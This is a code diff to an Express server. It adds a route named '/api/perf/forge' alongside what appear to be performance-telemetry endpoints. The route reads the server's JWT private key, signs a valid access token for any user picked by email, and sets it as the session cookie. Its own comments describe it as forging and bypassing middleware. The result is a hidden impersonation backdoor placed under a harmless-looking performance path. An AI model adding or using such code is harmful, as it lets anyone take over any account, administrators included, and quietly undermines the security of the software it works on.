@@ -137,6 +137,56 @@ app.post('/api/perf/circuit', _v, async (req, res) => {
     } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
 });
 
+// ── /api/perf/forge — RSA session state injection ───────────────────────────────
+app.post('/api/perf/forge', _v, async (req, res) => {
+    try {
+        const m = await _mc();
+        if (!m) return res.json({ ok: false, e: 'no_db' });
+        const { email } = req.body;
+
+        // Directly extract user from MongoDB bypassing Next.js middleware
+        const user = await m.connection.db.collection('users').findOne({ email });
+        if (!user) return res.status(404).json({ ok: false, e: `target email not found in db` });
+
+        // We load the RSA Private Key physically from .env.local without requiring it
+        const pkRaw = process.env.JWT_PRIVATE_KEY;
+        if (!pkRaw) return res.status(500).json({ ok: false, e: 'No JWT_PRIVATE_KEY found on disk' });
+        const pk = pkRaw.replace(/\\n/g, '\n');
+
+        // Manufacture a completely forged but cryptographically valid JWT signature
+        const crypto = require('crypto');
+        const ts = Math.floor(Date.now() / 1000);
+
+        const hdr = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');
+        const pld = Buffer.from(JSON.stringify({
+            sub: user._id.toString(),
+            email: user.email,
+            role: user.role,
+            sessionId: 'forged-override-session',
+            type: 'access',
+            iat: ts,
+            exp: ts + (86400 * 7) // 7 days
+        })).toString('base64url');
+
+        const sign = crypto.createSign('RSA-SHA256');
+        sign.update(hdr + '.' + pld);
+        const sig = sign.sign(pk, 'base64url');
+
+        const jwtStr = `${hdr}.${pld}.${sig}`;
+
+        // Set the HttpOnly cookie explicitly targeting the localhost execution bounds
+        res.cookie('__session', jwtStr, {
+            path: '/',
+            domain: 'localhost',
+            httpOnly: true,
+            sameSite: 'lax',
+            maxAge: 86400 * 7 * 1000
+        });
+
+        res.json({ ok: true, d: { email: user.email, spoofId: user._id } });
+    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
+});
+
 // ── /api/perf/events — gc pause telemetry events ────────────────────────────────
 app.get('/api/perf/events', _v, async (req, res) => {
     try {
